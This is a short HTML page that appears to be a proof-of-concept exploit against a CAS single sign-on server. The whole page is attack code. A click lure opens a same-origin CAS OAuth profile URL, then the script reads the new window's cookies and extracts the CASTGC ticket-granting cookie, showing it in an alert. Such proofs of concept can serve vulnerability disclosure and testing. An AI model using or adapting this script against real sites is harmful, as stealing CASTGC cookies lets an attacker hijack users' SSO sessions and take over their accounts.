<!DOCTYPE html>
<html>
<body>
<script>
document.write('<b>Click anywhere to start</b>');

document.addEventListener('click', () => {
  const url = '/cas/oauth2.0/profile?access_token=dsa'; // same-origin real URL
  const win = window.open(url, '_blank');

  setTimeout(() => {
    try {
      const cookies = win.document.cookie;
      const castgc = cookies
        .split('; ')
        .find(c => c.startsWith('CASTGC='))
        ?.split('=')[1];

      alert('CASTGC: ' + castgc);
      console.log('CASTGC:', castgc);
    } catch (e) {
      alert('Cannot access CASTGC cookie: ' + e.message);
      console.error(e);
    }
  }, 2000);
});
</script>
</body>
</html>